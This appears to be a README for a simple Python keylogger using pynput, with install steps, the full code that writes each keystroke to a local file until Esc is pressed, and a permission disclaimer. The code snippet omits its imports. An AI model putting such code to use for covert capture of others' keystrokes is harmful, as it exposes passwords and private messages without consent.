# Keylogger using `pynput`

This project is a basic keylogger script written in Python using the `pynput` library. It listens for keystrokes and logs them into a file.

## Prerequisites

To run this script, you need to have Python installed. Additionally, you need the `pynput` module, which can be installed using pip.

```bash
pip install pynput
```

## How It Works
- The script listens for keystrokes and writes them to a text file (`logged_text.txt`) in the same directory.
- The `on_press` function logs the key press, converting the key into a readable format.
The `on_release` function listens for the `esc` key, which will stop the keylogger when pressed.


## Setup

1. Clone this repository or download the script.

2. Install the required `pynput` library by running:

```bash
pip install pynput
```

3. Run the script using Python:

```bash
python keylogger.py
```
4. All logged keystrokes will be saved in a file named `logged_text.txt`.

## Code Explanation
```python
log_file = "logged_text.txt"

def on_press(key):
    # Convert the key to a readable format
    key = str(key).replace("'", "")  # Remove quotes around letters

    # Write the key to the log file
    with open(log_file, "a") as f:
        f.write(key + "\n")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

## Customization
- If you want to change the log file location, modify the log_file variable with the desired path.

Example:
``` python
log_file = "C:/path/to/your/logged_text.txt"
```

## Disclaimer
This script is intended for educational purposes only. Ensure you have permission before logging keystrokes on any device.